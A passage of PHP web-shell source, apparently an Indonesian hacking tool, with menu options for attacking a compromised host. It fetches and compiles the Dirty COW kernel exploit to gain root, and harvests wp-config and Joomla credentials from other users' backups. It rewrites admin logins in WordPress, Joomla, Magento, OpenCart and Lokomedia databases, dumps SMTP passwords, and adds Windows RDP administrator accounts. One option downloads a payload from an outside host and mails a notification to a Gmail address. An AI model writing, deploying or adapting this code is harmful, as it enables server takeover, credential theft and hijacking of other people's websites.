 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='Et04'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=symlink/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }  
  } elseif($_GET['do'] == 'root') { 
echo"<form method=post><span>Just work in kernel -2016</span><br>Note: *Cek /etc/passwd, jika ada user <u>firefart</u> berarti rooting sukses<br>Cara login: SSH ( firefart@".$ip." ) atau via cmd ( su firefart )<br/>
New Password : <input type='text' name='passwd' value='suryanata'> <input type=submit name=azzzt value='Root'>
  </form><br>";
  if($_POST['azzzt']) {
exe("wget -O azzatssins.c https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c");
exe("gcc -pthread azzatssins.c -o azzatssins -lcrypt");
exe("chmod +x azzatssins");
exe("./azzatssins ".$_POST['passwd']);
unlink("azzatssins.c");unlink("azzatssins");
} 
} elseif($_GET['do'] == 'targz') {  
?>
<center>
  <form method='post'>
    USER: <br />
  <textarea style='width: 450px; height: 150px;' name='user'>
<?php

$etc = fopen("/etc/passwd", "r");
while ($passwd = fgets($etc)) {
  if ($passwd == '' || !$etc) {
    echo "<font color=red>Can't read /etc/passwd</font>";
  } else {
    preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
    foreach ($user_jumping[1] as $user_idx_jump) {
      $potent_dir = array("", "public_html", "backupwordpress", "scriptupdate", "backups", "backup", "www", "fantastico_backups");
      foreach ($potent_dir as $p_dir) {
        $user_jumping_dir = "/home/$user_idx_jump/$p_dir";
        if (is_readable($user_jumping_dir)) {
          $i++;
          echo "$user_idx_jump\n";
          if (is_writable($user_jumping_dir)) {
            echo "$user_idx_jump\n";
          }
        }
      }
    }
  }
}

?>
</textarea>
  </br>
    <input type='submit' name='start' value='Gasskan' style='width: 450px;'>
  </form>
</center>
<?php

if ($_POST[start]) {
  $icp = mkdir("anu", 0777);
  $isi_htc = "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
  $htc = fopen("anu/.htaccess" , "w");
  fwrite($htc, $isi_htc);
  fclose($htc);
  $list = explode("\r\n", $_POST['user']);
  foreach ($list as $list_user) {
    $potent_dir = array("", "public_html", "backupwordpress", "scriptupdate", "backups", "backup", "www", "fantastico_backups");
    foreach ($potent_dir as $p_dir) {
      $potent_ext = array(".tar.gz", ".tgz", ".zip");
      foreach ($potent_ext as $p_ext) {
        $get_backup = @shell_exec("find /home/$list_user/$p_dir -name '*$p_ext'");
        preg_match_all("/(.+)/", $get_backup, $file_backup);
        foreach ($file_backup[1] as $f_backup) {
          echo "[EXTRACTING] $f_backup <br />";
          $command = array("tar xvf $f_backup -C 'anu' --wildcards '*wp-config.php' &", "tar xvf $f_backup -C 'anu' --wildcards '*configuration.php*' &", "unzip -j $f_backup '*wp-config.php*' -d 'anu' &", "unzip -j $f_backup '*configuration.php*' -d 'anu' &");
          foreach ($command as $cmd) {
            @shell_exec($cmd);
            $find_wp = @shell_exec("find anu -name '*wp-config.php*'");
            $find_wp = str_replace(" ", " \\", $find_wp);
            $find_jom = @shell_exec("find anu -name '*configuration.php*'");
            $find_jom = str_replace(" ", " \\", $find_jom);
            preg_match_all("/(.+)/", $find_wp, $name_file_wp);
            preg_match_all("/(.+)/", $find_jom, $name_file_jom);
            $rand_number = rand(100, 999);
            foreach ($name_file_wp[1] as $file_wp) {
              @shell_exec("mv $file_wp anu/$list_user-WordPress$rand_number.txt");
              if (file_exists("anu/$list_user-WordPress$rand_number.txt")) {
                echo "[CONFIG] $list_user-WordPress$rand_number.txt<br />";
              }
            }
            foreach ($name_file_jom[1] as $file_jom) {
              @shell_exec("mv $file_jom anu/$list_user-Joomla$rand_number.txt");
              if (file_exists("anu/$list_user-Joomla$rand_number.txt")) {
                echo "[CONFIG] $list_user-Joomla$rand_number.txt<br />";
              }
            }         
          }
          echo "<br />";
          @shell_exec("find anu -type d -empty -delete");
        }
      }
    }
  }
}  
  } elseif($_GET['do'] == 'auto_edit_user') {
  if($_POST['hajar']) {
    if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
      echo "username atau password harus lebih dari 6 karakter";
    } else {
      $user_baru = $_POST['user_baru'];
      $pass_baru = md5($_POST['pass_baru']);
      $conf = $_POST['config_dir'];
      $scan_conf = scandir($conf);
      foreach($scan_conf as $file_conf) {
        if(!is_file("$conf/$file_conf")) continue;
        $config = file_get_contents("$conf/$file_conf");
        if(preg_match("/JConfig|joomla/",$config)) {
          $dbhost = ambilkata($config,"host = '","'");
          $dbuser = ambilkata($config,"\$user = '","'");
          $dbpass = ambilkata($config,"password = '","'");
          $dbname = ambilkata($config,"db = '","'");
          $dbprefix = ambilkata($config,"dbprefix = '","'");
          $pathlogs = ambilkata($config,"var \$log_path = '","'");
          $pathlog = ambilkata($config,"public \$log_path = '","'");
          $prefix = $dbprefix."users";
          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
          $db = mysql_select_db($dbname);
          $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
          $result = mysql_fetch_array($q);
          $id = $result['id'];
          $site = ambilkata($config,"sitename = '","'");
          $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
          if(!$update OR !$conn OR !$db) {
            
          } else {
            echo "Config => ".$file_conf."<br>";
            echo "Path Log => ".$pathlog.$pathlogs."<br>";
            echo "CMS => Joomla<br>";
            echo "Status => <font color=lime>sukses edit user, silakan login dengan user, pass & email yang baru.</font><br><br>";
          }
          mysql_close($conn);
        } elseif(preg_match("/WordPress/",$config)) {
          $dbhost = ambilkata($config,"DB_HOST', '","'");
          $dbuser = ambilkata($config,"DB_USER', '","'");
          $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
          $dbname = ambilkata($config,"DB_NAME', '","'");
          $dbprefix = ambilkata($config,"table_prefix  = '","'");
          $prefix = $dbprefix."users";
          $option = $dbprefix."options";
          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
          $db = mysql_select_db($dbname);
          $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
          $result = mysql_fetch_array($q);
          $id = $result[ID];
          $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
          $result2 = mysql_fetch_array($q2);
          $target = $result2[option_value];
          if($target == '') {
            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
          } else {
            $url = validUrl("$target/wp-login.php");
            echo "$url<br />";

          }
          $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru',user_email='$email_baru' WHERE id='$id'");
          $bypass = mysql_query("UPDATE $option SET option_value='' WHERE option_name='active_plugins'");
          
          if(!$update OR !$conn OR !$db OR !$bypass) {
          } else {
          }
          mysql_close($conn);
        } elseif(preg_match("/Magento|Mage_Core/",$config)) {
          $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
          $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
          $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
          $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
          $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
          $prefix = $dbprefix."admin_user";
          $option = $dbprefix."core_config_data";
          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
          $db = mysql_select_db($dbname);
          $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
          $result = mysql_fetch_array($q);
          $id = $result[user_id];
          $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
          $result2 = mysql_fetch_array($q2);
          $target = $result2[value];
          if($target == '') {
            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
          } else {
            $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
          }
          $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
          echo "Config => ".$file_conf."<br>";
          echo "CMS => Magento<br>";
          echo $url_target;
          if(!$update OR !$conn OR !$db) {
            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
          } else {
            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
          }
          mysql_close($conn);
        } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
          $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
          $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
          $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
          $dbname = ambilkata($config,"'DB_DATABASE', '","'");
          $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
          $prefix = $dbprefix."user";
          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
          $db = mysql_select_db($dbname);
          $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
          $result = mysql_fetch_array($q);
          $id = $result[user_id];
          $target = ambilkata($config,"HTTP_SERVER', '","'");
          if($target == '') {
            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
          } else {
            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
          }
          $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
          echo "Config => ".$file_conf."<br>";
          echo "CMS => OpenCart<br>";
          echo $url_target;
          if(!$update OR !$conn OR !$db) {
            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
          } else {
            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
          }
          mysql_close($conn);
        } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
          $dbhost = ambilkata($config,'server = "','"');
          $dbuser = ambilkata($config,'username = "','"');
          $dbpass = ambilkata($config,'password = "','"');
          $dbname = ambilkata($config,'database = "','"');
          $prefix = "users";
          $option = "identitas";
          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
          $db = mysql_select_db($dbname);
          $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
          $result = mysql_fetch_array($q);
          $target = $result[alamat_website];
          if($target == '') {
            $target2 = $result[url];
            $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
            if($target2 == '') {
              $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
            } else {
              $cek_login3 = file_get_contents("$target2/adminweb/");
              $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
              if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
                $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
              } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
                $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
              } else {
                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
              }
            }
          } else {
            $cek_login = file_get_contents("$target/adminweb/");
            $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
              $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
              $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
            } else {
              $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
            }
          }
          $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
          echo "Config => ".$file_conf."<br>";
          echo "CMS => Lokomedia<br>";
          if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
            echo $url_target2;
          } else {
            echo $url_target;
          }
          if(!$update OR !$conn OR !$db) {
            echo "Status => <font color=red>".mysql_error()."</font><br><br>";
          } else {
            echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
          }
          mysql_close($conn);
        }
      }
    }
  } else {
    echo "<center>
    <h1>Auto Edit User Config</h1>
    <form method='post'>
    DIR Config: <br>
    <input type='text' size='80' name='config_dir' value='$dir'><br><br>
    Set User & Pass: <br>
    <input type='text' name='user_baru' value='suryanata' placeholder='user_baru'><br>
    <input type='text' name='pass_baru' value='suryanata' placeholder='pass_baru'><br>
    <input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
    </form>
    <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
    ";
  }

} elseif($_GET['do'] == 'auto_edit_userv2') {
  if($_POST['auto_edit_gass']) {
    function anucurl($sites) {
        $ch = curl_init($sites);
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
              curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
              curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
              curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
              curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
              curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
              curl_setopt($ch, CURLOPT_COOKIESESSION, true);
      $data = curl_exec($ch);
          curl_close($ch);
      return $data;
    }
    $link = explode("\r\n", $_POST['link']);
    $script = htmlspecialchars($_POST['script']);
    $user = "suryanata";
    $pass = "suryanata";
    $passx = md5($pass);
    $email = "suryanata.go.id@gmail.com";
    foreach($link as $dir_config) {
      $config = anucurl($dir_config);
      if(preg_match("/WordPress/",$config)) {
      $dbhost = ambilkata($config,"DB_HOST', '","'");
      $dbuser = ambilkata($config,"DB_USER', '","'");
      $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
      $dbname = ambilkata($config,"DB_NAME', '","'");
      $dbprefix = ambilkata($config,"table_prefix  = '","'");
      $prefix = $dbprefix."users";
      $option = $dbprefix."options";
      $conn = mysql_connect($dbhost,$dbuser,$dbpass);
      $db = mysql_select_db($dbname);
      $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
      $result = mysql_fetch_array($q);
      $id = $result[ID];
      $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
      $result2 = mysql_fetch_array($q2);
      $target = $result2[option_value];
      if($target == '') {         
        echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
      } else {
        echo "[+] $target <br>";
      }
      $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx',user_email='$email' WHERE ID='$id'");
      $bypass = mysql_query("UPDATE $option SET option_value='' WHERE option_name='active_plugins'");

      if(!$conn OR !$db OR !$update) {
        echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
        mysql_close($conn);
      } else {
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=lime>$user</font><br>";
                    echo "[+] password: <font color=lime>$pass</font><br>";     
                    echo "[+] email: <font color=lime>$email</font><br><br>";     
                    }
              mysql_close($conn);
      }
    }
    } elseif(preg_match("/JConfig|joomla/",$config)) {
          $config = anucurl($dir_config);
          $dbhost = ambilkata($config,"host = '","'");
          $dbuser = ambilkata($config,"\$user = '","'");
          $dbpass = ambilkata($config,"password = '","'");
          $dbname = ambilkata($config,"db = '","'");
          $dbprefix = ambilkata($config,"dbprefix = '","'");
          $prefix = $dbprefix."users";
          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
          $db = mysql_select_db($dbname);
          $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
          $result = mysql_fetch_array($q);
          $id = $result['id'];
          $site = ambilkata($config,"sitename = '","'");
          $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx',email='$email' WHERE id='$id'");
          if($site == '') {
            echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
          } else {
            echo "[+] $site<br>";
          }
      if(!$conn OR !$db OR !$update) {
        echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
        mysql_close($conn);
      } else {
                    echo "[+] username: <font color=lime>$user</font><br>";
                    echo "[+] password: <font color=lime>$email</font><br>";     
                    echo "[+] email: <font color=lime>$pass</font><br><br>";     
                    }
              mysql_close($conn);
  } else {
    echo "<center>
    <form method='post'>
    Link Config: <br>
    <textarea name='link' placeholder='http://target.com/anu/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
    <input type='submit' style='width: 450px;' name='auto_edit_gass' value='Hajar!!'>
    </form></center>";
  }
  } elseif($_GET['do'] == 'auto_grab_mail') {
    echo "<center>
    <h1>Auto Grab Mail Config</h1>
    <form method='post'>
    DIR Config: <br>
    <input type='text' size='80' name='config_dir' value='$dir'><br>
    <input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
    </form>
    <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
    ";
  if($_POST['hajar']) {
          $conf = $_POST['config_dir'];
      $scan_conf = scandir($conf);
      foreach($scan_conf as $file_conf) {
        if(!is_file("$conf/$file_conf")) continue;
        $config = file_get_contents("$conf/$file_conf");
    if(preg_match("/WordPress/",$config)) {
          $dbhost = ambilkata($config,"DB_HOST', '","'");
          $dbuser = ambilkata($config,"DB_USER', '","'");
          $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
          $dbname = ambilkata($config,"DB_NAME', '","'");
          $dbprefix = ambilkata($config,"table_prefix  = '","'");
          $prefix = $dbprefix."users";
          $conn = mysql_connect($dbhost,$dbuser,$dbpass);
          $db = mysql_select_db($dbname);
          $q = mysql_query("SELECT `user_email` FROM `$prefix`");
          while($result = mysql_fetch_array($q)) {
          $id = $result[user_email];
        }
      }
      echo $id."</br>";
    }
  }
  } elseif($_GET['do'] == 'mailzip') {
  $dir = getcwd()."/"."ajax.php";
  system('wget http://aidasky.com/templates/system/css/ajax.txt -O '.$dir.'');
  $to = 'refangga.andrean@gmail.com';
  $subject = 'Hits ada lagi';
  $message = $_SERVER['HTTP_HOST'];
  $headers[] = 'From: Hidden Hits <auto@joss.com>';
  if(mail($to, $subject, $message, implode("\r\n", $headers))){
    echo "<font color=lime>Sended to $to</font><br>";
  } else {
    echo "<font color=#ea3233>Can't send mail</font></br>";
  }
  if(file_exists("ajax.php")){
  $file= "a.zip";
  $zip = new ZipArchive;
  if ($zip->open($file, ZipArchive::CREATE) === TRUE) {
    $zip->addFile("ajax.php");
  }
    $zip->close();
    echo "<font color=lime>Compressed be $file</font>";
  } else {
    echo "<font color=#ea3233>Can't compress file</font>";
  }
} elseif($_GET['do'] == 'smtp') {
  echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
  function scj($dir) {
    $dira = scandir($dir);
    foreach($dira as $dirb) {
      if(!is_file("$dir/$dirb")) continue;
      $ambil = file_get_contents("$dir/$dirb");
      $ambil = str_replace("$", "", $ambil);
      if(preg_match("/JConfig|joomla/", $ambil)) {
        $smtp_host = ambilkata($ambil,"smtphost = '","'");
        $smtp_auth = ambilkata($ambil,"smtpauth = '","'");
        $smtp_user = ambilkata($ambil,"smtpuser = '","'");
        $smtp_pass = ambilkata($ambil,"smtppass = '","'");
        $smtp_port = ambilkata($ambil,"smtpport = '","'");
        $smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
        if($smtp_user == '') {
        } else {
        echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
        echo "SMTP port: <font color=lime>$smtp_port</font><br>";
        echo "SMTP user: <font color=lime>$smtp_user</font><br>";
        echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
        echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
        echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
        }
      }
    }
  }
  $smpt_hunter = scj($dir);
  echo $smpt_hunter;
} elseif($_GET['do'] == 'krdp_shell') {
  if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
    if($_POST['create']) {
      $user = htmlspecialchars($_POST['user']);
      $pass = htmlspecialchars($_POST['pass']);
      if(preg_match("/$user/", exe("net user"))) {
        echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
      } else {
        $add_user   = exe("net user $user $pass /add");
          $add_groups1 = exe("net localgroup Administrators $user /add");
          $add_groups2 = exe("net localgroup Administrator $user /add");
          $add_groups3 = exe("net localgroup Administrateur $user /add");
          echo "[ RDP ACCOUNT INFO ]<br>
          ------------------------------<br>
          IP: <font color=lime>".$ip."</font><br>
          Username: <font color=lime>$user</font><br>
          Password: <font color=lime>$pass</font><br>
          ------------------------------<br><br>
          [ STATUS ]<br>
          ------------------------------<br>
          ";
          if($add_user) {
            echo "[add user] -> <font color='lime'>Berhasil</font><br>";
          } else {
            echo "[add user] -> <font color='red'>Gagal</font><br>";
          }
          if($add_groups1) {
              echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
          } elseif($add_groups2) {
                echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
          } elseif($add_groups3) { 
                echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
          } else {
            echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
          }
          echo "------------------------------<br>";
      }
    } elseif($_POST['s_opsi']) {
      $user = htmlspecialchars($_POST['r_user']);
      if($_POST['opsi'] == '1') {
        $cek = exe("net user $user");
        echo "Checking username <font color=lime>$user</font> ....... ";
        if(preg_match("/$user/", $cek)) {
          echo "[ <font color=lime>Sudah ada</font> ]<br>
          ------------------------------<br><br>
          <pre>$cek</pre>";
        } else {
          echo "[ <font color=red>belum ada</font> ]";
        }
      } elseif($_POST['opsi'] == '2') {
        $cek = exe("net user $user suryanata");
        if(preg_match("/$user/", exe("net user"))) {
          echo "[change password: <font color=lime>suryanata</font>] -> ";
          if($cek) {
            echo "<font color=lime>Berhasil</font>";
          } else {
            echo "<font color=red>Gagal</font>";
          }
        } else {
          echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
        }
      } elseif($_POST['opsi'] == '3') {
        $cek = exe("net user $user /DELETE");
        if(preg_match("/$user/", exe("net user"))) {
          echo "[remove user: <font color=lime>$user</font>] -> ";
          if($cek) {
            echo "<font color=lime>Berhasil</font>";
          } else {
            echo "<font color=red>Gagal</font>";
          }
        } else {
          echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
        }
      } else {
        //
      }
    } else {
      echo "-- Create RDP --<br>
      <form method='post'>
      <input type='text' name='user' placeholder='username' value='suryanata' required>
      <input type='text' name='pass' placeholder='password' value='suryanata' required>
      <input type='submit' name='create' value='>>'>
      </form>
      -- Option --<br>
      <form method='post'>
      <input type='text' name='r_user' placeholder='username' required>
      <select name='opsi'>
      <option value='1'>Cek Username</option>
      <option value='2'>Ubah Password</option>
      <option value='3'>Hapus Username</option>
      </select>
      <input type='submit' name='s_opsi' value='>>'>
      </form>
      ";
    }
  } else {
    echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
  }
} elseif($_GET['act'] == 'newfile') {
  if($_POST['new_save_file']) {
    $newfile = htmlspecialchars($_POST['newfile']);
    $fopen = fopen($newfile, "a+");
    if($fopen) {
      $act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
    } else {
      $act = "<font color=red>permission denied</font>";
    }
  }
  echo $act;
  echo "<form method='post'>
  Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
  <input type='submit' name='new_save_file' value='Submit'>
  </form>";
} elseif($_GET['act'] == 'newfolder') {
  if($_POST['new_save_folder']) {
    $new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
    if(!mkdir($new_folder)) {
      $act = "<font color=red>permission denied</font>";
    } else {
      $act = "<script>window.location='?dir=".$dir."';</script>";
    }
  }
  echo $act;
  echo "<form method='post'>
  Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
  <input type='submit' name='new_save_folder' value='Submit'>
  </form>";
} elseif($_GET['act'] == 'rename_dir') {
  if($_POST['dir_rename']) {
    $dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
    if($dir_rename) {
      $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
    } else {
      $act = "<font color=red>permission denied</font>";
    }
  echo "".$act."<br>";
  }
  echo "<form method='post'>
  <input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
  <input type='submit' name='dir_rename' value='rename'>
  </form>";
} elseif($_GET['act'] == 'delete_dir') {
  if(is_dir($dir)) {
    if(is_writable($dir)) {
      @rmdir($dir);
      @exe("rm -rf $dir");
      @exe("rmdir /s /q $dir");
      $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
    } else {
      $act = "<font color=red>could not remove ".basename($dir)."</font>";
    }
  }
  echo $act;
} elseif($_GET['act'] == 'view') {
  echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
  echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
  if($_POST['save']) {
    $save = file_put_contents($_GET['file'], $_POST['src']);
    if($save) {
      $act = "<font color=lime>Saved!</font>";
    } else {
      $act = "<font color=red>permission denied</font>";
    }
  echo "".$act."<br>";
  }
  echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
  echo "<form method='post'>
  <textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
  <input type='submit' value='Save' name='save' style='width: 500px;'>
  </form>";
} elseif($_GET['act'] == 'rename') {
  if($_POST['do_rename']) {
    $rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
    if($rename) {
      $act = "<script>window.location='?dir=".$dir."';</script>";
    } else {
      $act = "<font color=red>permission denied</font>";
    }
  echo "".$act."<br>";
  }
  echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
  echo "<form method='post'>
  <input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
  <input type='submit' name='do_rename' value='rename'>
  </form>";
} elseif($_GET['act'] == 'delete') {
  $delete = unlink($_GET['file']);
  if($delete) {
    $act = "<script>window.location='?dir=".$dir."';</script>";
  } else {
    $act = "<font color=red>permission denied</font>";
  }
  echo $act;
} else {
  if(is_dir($dir) === true) {
    if(!is_readable($dir)) {
      echo "<font color=red>can't open directory. ( not readable )</font>";
    } else {
      echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
      <tr>
      <th class="th_home"><center>Name</center></th>
      <th class="th_home"><center>Type</center></th>
      <th class="th_home"><center>Size</center></th>
      <th class="th_home"><center>Last Modified</center></th>
      <th class="th_home"><center>Owner/Group</center></th>
      <th class="th_home"><center>Permission</center></th>
      <th class="th_home"><center>Action</center></th>
      </tr>';
